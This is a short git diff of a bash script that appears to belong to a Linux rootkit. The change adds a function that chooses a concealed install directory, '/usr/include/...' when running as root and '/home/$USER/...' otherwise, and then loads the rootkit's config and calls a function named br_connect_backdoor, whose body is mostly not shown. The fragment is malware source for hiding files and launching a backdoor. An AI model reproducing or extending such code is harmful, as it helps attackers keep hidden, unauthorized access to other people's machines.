@@ -1,8 +1,15 @@
 #!/bin/bash
 
-BR_ROOTKIT_PATH="/usr/include/..."
+declare BR_ROOTKIT_PATH
 
-. $BR_ROOTKIT_PATH/brconfig.sh
+function br_set_rootkit_path()
+{
+        if [ $UID -eq 0 -o $EUID -eq 0 ]; then
+		BR_ROOTKIT_PATH="/usr/include/..."
+	else
+                BR_ROOTKIT_PATH="/home/$USER/..."
+	fi
+}
 
 function br_connect_backdoor()
 {
@@ -31,5 +38,7 @@ function br_connect_backdoor()
 	done
 }
 
+br_set_rootkit_path
+. $BR_ROOTKIT_PATH/brconfig.sh
 br_load_config $BR_ROOTKIT_PATH/br.conf
 br_connect_backdoor
